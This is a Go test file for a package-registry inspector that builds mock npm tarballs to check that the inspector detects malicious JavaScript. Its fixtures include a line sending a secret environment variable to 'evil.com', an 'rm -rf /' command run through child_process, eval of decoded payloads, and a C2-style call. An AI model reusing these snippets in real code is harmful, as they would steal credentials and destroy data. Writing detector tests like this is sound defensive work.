package osv

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/GustavoGutierrez/celador/internal/core/shared"
)

// helperTarball creates a gzipped tarball with the given files
func helperTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	for name, content := range files {
		header := &tar.Header{
			Name: "package/" + name,
			Mode: 0644,
			Size: int64(len(content)),
		}
		if err := tw.WriteHeader(header); err != nil {
			t.Fatalf("write header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write content %s: %v", name, err)
		}
	}

	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func helperMockServer(t *testing.T, tarball []byte) *httptest.Server {
	t.Helper()
	var server *httptest.Server
	server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/latest") {
			json.NewEncoder(w).Encode(map[string]any{
				"name":    "test-pkg",
				"version": "1.0.0",
				"dist":    map[string]string{"tarball": fmt.Sprintf("%s/pkg.tgz", server.URL)},
			})
		} else {
			w.Header().Set("Content-Type", "application/gzip")
			w.Write(tarball)
		}
	}))
	return server
}

func TestInspectTarball_MaliciousJSFile_Eval(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"index.js":     `const code = "malicious"; eval(atob(code));`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if assessment.Risk == shared.SeverityLow {
		t.Error("expected risk > low for package with eval() in JS file")
	}
	if !assessment.ShouldPrompt {
		t.Error("expected ShouldPrompt=true for eval() detection")
	}

	foundEvalReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "eval(") || strings.Contains(reason, "dynamic execution") {
			foundEvalReason = true
		}
	}
	if !foundEvalReason {
		t.Errorf("expected eval() detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_MaliciousJSFile_NewFunction(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"lib/core.js":  `const fn = new Function("return process.env"); fn();`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if assessment.Risk == shared.SeverityLow {
		t.Error("expected risk > low for package with new Function() in JS file")
	}

	foundFuncReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "new Function(") || strings.Contains(reason, "dynamic execution") {
			foundFuncReason = true
		}
	}
	if !foundFuncReason {
		t.Errorf("expected new Function() detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_MaliciousJSFile_NetworkExfil(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"lib/send.js":  `const https = require('https'); https.request({hostname: 'evil.com', path: '/steal?token=' + process.env.SECRET_KEY});`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if assessment.Risk == shared.SeverityLow {
		t.Error("expected risk > low for package with network exfiltration in JS file")
	}

	foundExfilReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "network") || strings.Contains(reason, "exfiltration") || strings.Contains(reason, "env") {
			foundExfilReason = true
		}
	}
	if !foundExfilReason {
		t.Errorf("expected network exfiltration detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_ChildProcessExec(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"scripts/run.js": `const { exec } = require('child_process'); exec('rm -rf /');`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if assessment.Risk == shared.SeverityLow {
		t.Error("expected risk > low for package with child_process.exec in JS file")
	}

	foundExecReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "child_process") || strings.Contains(reason, "exec") || strings.Contains(reason, "command") {
			foundExecReason = true
		}
	}
	if !foundExecReason {
		t.Errorf("expected child_process.exec detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_ObfuscatedStrings(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	longHex := strings.Repeat("abcdef0123456789", 10) // 160 chars
	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"lib/payload.js": fmt.Sprintf(`const key = "%s"; sendToC2(key);`, longHex),
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	foundHexReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "encoded") || strings.Contains(reason, "obfuscated") || strings.Contains(reason, "hex") {
			foundHexReason = true
		}
	}
	if !foundHexReason {
		t.Errorf("expected obfuscated string detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_NativeBinary_Node(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"build/binding.node": "fake binary content",
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	foundNodeReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, ".node") || strings.Contains(reason, "native") || strings.Contains(reason, "binary") {
			foundNodeReason = true
		}
	}
	if !foundNodeReason {
		t.Errorf("expected .node binary detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_CleanPackage_NoFalsePositives(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"express","version":"4.18.2"}`,
		"index.js":     `module.exports = require('./lib/express');`,
		"lib/express.js": `function createApplication() { return function app(req, res) {}; }`,
		"README.md":    "# Express - Fast web framework",
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "express")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Clean packages should not trigger malicious code alerts
	maliciousPatterns := []string{"eval(", "new Function(", "child_process", "exfiltration", "obfuscated"}
	for _, pattern := range maliciousPatterns {
		for _, reason := range assessment.Reasons {
			if strings.Contains(strings.ToLower(reason), strings.ToLower(pattern)) {
				t.Errorf("false positive: clean express package triggered '%s' alert. Reasons: %v", pattern, assessment.Reasons)
			}
		}
	}
}

func TestInspectTarball_MultipleFiles(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json":   `{"name":"test-pkg","version":"1.0.0"}`,
		"lib/safe.js":    `module.exports = {};`,
		"lib/malicious.js": `eval(hiddenPayload);`,
		"utils/helper.js": `const fs = require('fs');`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should detect the malicious file among multiple files
	foundMalicious := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "eval(") || strings.Contains(reason, "dynamic execution") {
			foundMalicious = true
		}
	}
	if !foundMalicious {
		t.Errorf("expected detection from malicious.js among multiple files, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_SkipsNonSourceFiles(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	// Create a tarball with eval() in non-source files (should NOT be detected)
	// and eval() in a source file (SHOULD be detected)
	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"README.md":    `This package uses eval() in documentation example`,
		"LICENSE":      `You can eval() this license agreement...`,
		"src/real.js":  `const x = eval(userInput);`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should only flag the actual source file, not README or LICENSE
	evalCount := 0
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "eval(") || strings.Contains(reason, "dynamic execution") {
			evalCount++
		}
	}
	if evalCount == 0 {
		t.Error("expected eval() detection from source file, got none")
	}
}

func TestInspectTarball_PackageJsonStillChecked(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	// Ensure package.json scanning still works alongside JS file scanning
	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0","scripts":{"postinstall":"node setup.js"}}`,
		"index.js":     `module.exports = {};`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should still detect postinstall script in package.json
	foundPostinstall := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "postinstall") || strings.Contains(reason, "install-time") || strings.Contains(reason, "scripts") {
			foundPostinstall = true
		}
	}
	if !foundPostinstall {
		t.Errorf("expected postinstall detection from package.json, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_TypeScriptFiles(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"src/index.ts": `const payload = eval(userInput); console.log(payload);`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	foundEvalReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "eval(") || strings.Contains(reason, "dynamic execution") {
			foundEvalReason = true
		}
	}
	if !foundEvalReason {
		t.Errorf("expected eval() detection in TypeScript file, got: %v", assessment.Reasons)
	}
}

func TestInspectTarball_MjsAndCjsFiles(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tarball := helperTarball(t, map[string]string{
		"package.json": `{"name":"test-pkg","version":"1.0.0"}`,
		"lib/module.mjs": `eval(atob(payload));`,
		"lib/common.cjs": `new Function(code)();`,
	})

	server := helperMockServer(t, tarball)
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)
	assessment, err := inspector.InspectPackage(ctx, shared.PackageManagerNPM, "test-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should detect patterns in both .mjs and .cjs files
	if assessment.Risk == shared.SeverityLow {
		t.Error("expected risk > low for eval/new Function in .mjs/.cjs files")
	}
}

func TestIsSourceFile(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		path     string
		expected bool
	}{
		{"package.json", "package.json", true},
		{"index.js", "index.js", true},
		{"lib/core.js", "lib/core.js", true},
		{"src/app.ts", "src/app.ts", true},
		{"module.mjs", "module.mjs", true},
		{"util.cjs", "util.cjs", true},
		{"binary.node", "binary.node", true},
		{"README.md", "README.md", false},
		{"LICENSE", "LICENSE", false},
		{"styles.css", "styles.css", false},
		{"data.json", "data.json", false},
		{"package/package.json", "package/package.json", true},
		{"package/lib/index.js", "package/lib/index.js", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isSourceFile(tt.path)
			if result != tt.expected {
				t.Errorf("isSourceFile(%q) = %v, want %v", tt.path, result, tt.expected)
			}
		})
	}
}
